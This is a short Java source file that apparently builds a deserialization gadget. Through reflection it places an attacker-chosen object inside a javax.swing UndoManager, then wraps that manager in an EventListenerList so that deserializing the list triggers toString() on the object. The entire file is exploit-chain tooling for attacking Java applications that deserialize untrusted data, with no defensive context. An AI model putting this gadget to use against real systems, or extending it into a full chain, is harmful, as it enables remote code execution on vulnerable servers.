package com.example;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.util.Vector;

public class Gadget_Event2toString {
    public static EventListenerList getEventListenerList(Object obj) throws Exception{
        EventListenerList eventListenerList = new EventListenerList();
        UndoManager manager = new UndoManager();

        Vector vector = (Vector) Utils.getFieldValue(manager, "edits");
        vector.add(obj);

        Utils.SetValue(eventListenerList, "listenerList", new Object[]{InternalError.class, manager});
        return eventListenerList;
    }
}
